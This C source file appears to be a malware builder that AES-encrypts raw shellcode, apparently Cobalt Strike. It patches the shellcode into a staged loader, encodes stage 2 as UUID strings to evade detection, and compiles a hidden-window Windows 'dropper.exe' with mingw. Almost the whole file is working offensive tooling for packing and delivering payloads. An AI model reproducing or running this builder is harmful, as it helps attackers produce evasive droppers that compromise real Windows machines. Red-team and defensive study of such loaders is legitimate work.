
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <libgen.h>         // dirname
#include <unistd.h>         // readlink
#include <linux/limits.h>   // PATH_MAX
#include <argp.h>
#include <ctype.h>
#include "aes.h"
#include "aes.c"

#define BUFFER_SIZE 6000000 //based on shellcode size * 6 due to hex formatting with '0x<Hex><Hex>, '
#pragma warning(disable : 4996) //Necessary to allow "deprecated" functions
char systemcommand[255];

//Find any occurance of a string in buffer and replace with specified value
void replaceAll(unsigned char* str, unsigned char* oldWord, unsigned char* newWord) 
{
    unsigned char* temp = malloc(BUFFER_SIZE * sizeof(char));
    unsigned char* pos;
    int index = 0;
    int owlen;

    owlen = strlen(oldWord);

    // Fix: If oldWord and newWord are same it goes to infinite loop
    if (!strcmp(oldWord, newWord)) {
        return;
    }

    //Repeat till all occurrences are replaced.
    while ((pos = strstr(str, oldWord)) != NULL)
    {
        // Backup current line
        strcpy(temp, str);

        // Index of current found word
        index = pos - str;

        // Terminate str after word found index
        str[index] = '\0';

        // Concatenate str with new word 
        strcat(str, newWord);

        // Concatenate str with remaining words after 
        // oldword found index.
        strcat(str, temp + index + owlen);

    }
    //Free buffer
    free(temp);
}

//Read file into buffer for manipulation
void ReadFile(const char* filename, unsigned char** buffer, long* filelen, int addedbuffer)
{
    FILE* fileptr;
    //unsigned char* buffer;
    long filelenval;

    fileptr = fopen(filename, "rb");  // Open the file in binary mode
    fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
    filelenval = ftell(fileptr);             // Get the current unsigned char offset in the file
    *filelen = filelenval;
    rewind(fileptr);                      // Jump back to the beginning of the file
    
    *buffer = (unsigned char*)malloc((filelenval + addedbuffer) * sizeof(unsigned char)); // Enough memory for the file
    fread(*buffer, filelenval, 1, fileptr); // Read in the entire file
    fclose(fileptr); // Close the file
}

//----------------------------------------------------------Main Builder--------------------------------------------------

int main(int argc, char** argv)
{
    if (argc == 1)
    {
        printf("Usage: builder template arch stage1stub stage2stub rawshellcode");
        return 0;
    }

    //Initialize buffers and variables
    int i;

    //get & set path that Builder is running from so relative paths may be used later in execution
    char result[PATH_MAX];
    ssize_t val = readlink("/proc/self/exe", result, PATH_MAX);
    const char *path;
    if (val != -1) {
        path = dirname(result);
    }
    chdir(path);


//-----------------------------Generate initial AES key/iv for CS shellcode and stage1/stage2 encryption---------------------------
    //Generate AES key/iv 
    unsigned char key[16];
    srand(time(NULL));
    for (i = 0; i < sizeof(key); i++) {
        key[i] = rand() % 256;
    }
    sleep(1); //sleep 1 second so that we get a different IV from KEY since we seeded based on time
    unsigned char iv[16];
    for (i = 0; i < sizeof(iv); i++) {
        iv[i] = rand() % 256;
    }

    //Format Key into Hex format
    int bufflength = sizeof(key) * 6;
    unsigned char keybuffer[200];
    for (i = 0; i < sizeof(key); i++)
    {

        sprintf(&keybuffer[i * 6], "0x%02X, ", key[i]);

    }
    keybuffer[bufflength - 2] = '\0';

    //Format IV into Hex format
    bufflength = sizeof(iv) * 6;
    unsigned char ivbuffer[200];
    for (i = 0; i < sizeof(iv); i++)
    {

        sprintf(&ivbuffer[i * 6], "0x%02X, ",iv[i]);

    }
    ivbuffer[bufflength - 2] = '\0';

//------------------------------Build Stage 2--------------------------------

    //Read in Stage 2 stub
    unsigned char* stage2stub;
    long stage2stublen;
    ReadFile(argv[4], &stage2stub, &stage2stublen, 15); //15 extra bytes allocated to stage2stub buffer so it can be padded with null bytes as needed to fit uuid format.  Not represented in stage2stublen var.
    printf("length of original rdll stub is: %d\n", stage2stublen);

    unsigned char* keybuf = (unsigned char*)malloc(stage2stublen * sizeof(unsigned char)); // Enough memory for the file
    unsigned char* ivbuf = (unsigned char*)malloc(stage2stublen * sizeof(unsigned char)); // Enough memory for the file
    unsigned char* stage2final = (unsigned char*)malloc(stage2stublen * sizeof(unsigned char)); // Enough memory for the file

    //Read in shellcode
    unsigned char* rawshellcode;
    long rawsclen;
    ReadFile(argv[5], &rawshellcode, &rawsclen, 0);
    printf("length of shellcode is: %d\n", rawsclen);

    //Encrypt CS shellcode
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, rawshellcode, rawsclen);

    //-----------Find + Replace Stage2 stub------------
    //Key egg
    unsigned char keyneedle[8] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};
    size_t needlelen = sizeof(keyneedle);
    unsigned char *p = memmem(stage2stub, stage2stublen, keyneedle, needlelen); 
    int position = p - stage2stub;
    int remainder = stage2stublen - position - sizeof(key);
    printf("position of stage2 key egg is: %d\n", position);
    printf("remainder is %d\n", remainder);
    memcpy(keybuf, stage2stub, position); // Bytes before placeholder
    memcpy(keybuf + position, key, sizeof(key)); //Patch in key
    memcpy(keybuf + position + sizeof(key), stage2stub + position + sizeof(key), remainder); //add rest of payload


    //IV egg
    unsigned char ivneedle[8] = {0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42};
    unsigned char *q = memmem(keybuf, stage2stublen, ivneedle, needlelen); 
    position = q - keybuf;
    remainder = stage2stublen - position - sizeof(iv);
    printf("position of stage2 IV egg is: %d\n", position);
    printf("remainder is %d\n", remainder);
    memcpy(ivbuf, keybuf, position); // Bytes before placeholder
    memcpy(ivbuf + position, iv, sizeof(iv)); //Patch in IV
    memcpy(ivbuf + position + sizeof(iv), keybuf + position + sizeof(iv), remainder); //add rest of payload


    //Shellcode egg
    unsigned char shellneedle[8] = {0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43};
    unsigned char *r = memmem(ivbuf, stage2stublen, shellneedle, needlelen); 
    position = r - ivbuf;
    remainder = stage2stublen - position - rawsclen;
    printf("position of stage2 shellcode egg is: %d\n", position);
    printf("remainder is %d\n", remainder);
    memcpy(stage2final, ivbuf, position); // Bytes before placeholder
    memcpy(stage2final + position, rawshellcode, rawsclen); //Patch in shellcode
    memcpy(stage2final + position + rawsclen, ivbuf + position + rawsclen, remainder); //add rest of payload

    printf("length of position + rawsclen + remainder is: %d while length of stage2stublen is %d\n", position + rawsclen + remainder, stage2stublen);
    free(rawshellcode);
/*
    FILE* fileptr;
	fileptr = fopen("CompleteStage2.exe", "wb");  // Open the file in binary mode
	fwrite(stage2final, 1, position + rawsclen + remainder, fileptr);
	fclose(fileptr); // Close the file
    printf("position is %d rawsclen is %d remainder is %d\n", position, rawsclen, remainder);
    printf("wrote %d bytes to CompleteStage1.exe!\n", position + rawsclen + remainder);
*/

    //Calculate number of uuid's stage2final will comprise
    int numuuids = ((position + rawsclen + remainder) / 16);
    int remuuids = (position + rawsclen + remainder) % 16;
    int paduuids = 16 - remuuids;

    unsigned char null = {0x00};

    //UUID octect format and example uuid
    //4-2-2-2-6             54bb48ff-367e-1da3-16ea-2c4831582748


    //Copy as many null bytes as needed to end of stage2final in order to make divisible by 16 / fit uuid format.
    if(remuuids != 0)
    {
        for(i = 0; i < paduuids; i++)
        {
            memcpy(stage2final + position + rawsclen + remainder + i, &null, 1);
        }
        //redefine rawsclen to include number of null bytes added + add 1 to numuuids to account for added null bytes/remainder
        rawsclen = rawsclen + paduuids;
        numuuids = numuuids + 1;
    }

    //Calculate uuidbufsize by multiplying number of uuids by 36 (length of a single uuid)
    int uuidbufsize = numuuids * 36;

    //Turn length of uuidbuf into a char variable in order to replace in template file
    char uuidbuflenchar[100];
    sprintf(uuidbuflenchar, "%d", uuidbufsize);

    //Encrypt entire stage2 payload
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, stage2final, position + rawsclen + remainder);

    printf("length of stage2final buffer is: %d\n", position + rawsclen + remainder);
    printf("numuids is: %d and remuuids is: %d and uuidbufsize is: %d\n", numuuids, remuuids, uuidbufsize);

    //Initialize vars and buffer based on previously calculated values
    unsigned char* uuidbuf = (unsigned char*)malloc(uuidbufsize * sizeof(unsigned char));
    unsigned char uuid[36];
    int scoffset = 0;
    int count = 0;
    int j;

    //Convert completed stage2 to one giant string of uuid's. Uuid's are mixed-endian; First 3 "octets" are little-endian while last 2 are big-endian.
    for (i=0; i<numuuids; i++) 
    {          
        sprintf(uuid, "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X", stage2final[scoffset+3], stage2final[scoffset+2], stage2final[scoffset+1], stage2final[scoffset], stage2final[scoffset+5], stage2final[scoffset+4], stage2final[scoffset+7], stage2final[scoffset+6], stage2final[scoffset+8], stage2final[scoffset+9], stage2final[scoffset+10], stage2final[scoffset+11], stage2final[scoffset+12], stage2final[scoffset+13], stage2final[scoffset+14], stage2final[scoffset+15]);
        for(int j = 0; uuid[j]; j++)
        {
            uuid[j] = tolower(uuid[j]);
        }
        memcpy(uuidbuf + count, uuid, 36);
        count = count + 36;
        scoffset = scoffset + 16;
    }

    printf("Stage2 Complete!\n\n");


//------------------------------Build Stage 1--------------------------------

    //AES encrypt stage 1
    unsigned char* rawstage1;
    long rawstage1len;
    ReadFile(argv[3], &rawstage1, &rawstage1len, 0);

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, rawstage1, rawstage1len);
    
    //Format encrypted shellcode into Hex format
    bufflength = rawstage1len * 6;
    char* stage1sc = malloc(BUFFER_SIZE * sizeof(char));
    for (i = 0; i < rawstage1len; i++)
    {
        sprintf(&stage1sc[i * 6], "0x%02X, ", rawstage1[i]);
    }
    stage1sc[bufflength - 2] = '\0';
    char stage1lenchar[100];
    sprintf(stage1lenchar, "%d", rawstage1len);
    free(rawstage1);
    printf("stage1 encrypted and completed!\n");


//----------------------------Format Template--------------------------------
    FILE * fPtr;
    FILE * fTemp;
    char* buffer2 = malloc(BUFFER_SIZE * sizeof(char));
    char oldWord[] = "STAGE1";
    char secondword[] = "SCLENGTH1";
    char stage2word[] = "STAGE2";
    char stage2lenword[] = "ST2LEN";
    char keyword[] = "AESKEY";
    char ivword[] = "IVVALUE";

    //Open template file
    fPtr = fopen(argv[1], "r");
    //Open .tmp file to write payload to
    fTemp = fopen("replace.tmp", "w");
    //printf("Opened: %s!\n", arguments.args[1]);
    if (fPtr == NULL || fTemp == NULL)
    {
        printf("\nUnable to open file.\n");
        exit(EXIT_SUCCESS);
    }

    //Go through file line by line and pass to replaceAll function which will search for placeholders and replace with the appropriate buffer
    while ((fgets(buffer2, BUFFER_SIZE, fPtr)) != NULL)
    {
        
        replaceAll(buffer2, oldWord, stage1sc);
        replaceAll(buffer2, secondword, stage1lenchar);
        replaceAll(buffer2, stage2word, uuidbuf);
        replaceAll(buffer2, stage2lenword, uuidbuflenchar);
        replaceAll(buffer2, keyword, keybuffer);
        replaceAll(buffer2, ivword, ivbuffer);

        fputs(buffer2, fTemp);
    }
    //Close files
    fclose(fPtr);
    fclose(fTemp);

    const char* extension = strrchr(argv[1], '_');
    if(strcmp(extension, "_exe.c") == 0)
    {        
        //Remove existing post-replacement .c source file if it exists
        remove("src/Stage0/newstage0.c");
        //Rename temp file 
        rename("replace.tmp", "src/Stage0/newstage0.c");
    }

//---------------------------Compile------------------------------

    //Create mingw command to execute via system call. Compile based on arguments.args[2] which is the architecture passed from CS
    if(strcmp(extension, "_exe.c") == 0) //.exe payloads
    {        
        if(strcmp(argv[2], "x64") == 0)
        { //x64
            sprintf(systemcommand, "x86_64-w64-mingw32-gcc src/Stage0/newstage0.c -o dropper.exe -mwindows -s -DUNICODE -Os -L /usr/x86_64-w64-mingw32/lib -l:librpcrt4.a");
            //sprintf(systemcommand, "x86_64-w64-mingw32-gcc payload_source_code/customexe.c -o %s -s -DUNICODE -Os", arguments.args[0]);
        }
    }

    int status = system(systemcommand); //Call compiler to produce payload.

    printf("\nStage0 compiled! Output dropper.exe!\n");

    //free buffers
    free(stage1sc);
    free(buffer2);
    free(uuidbuf);
    free(keybuf);
    free(ivbuf);
    free(stage2final);
    free(stage2stub);
}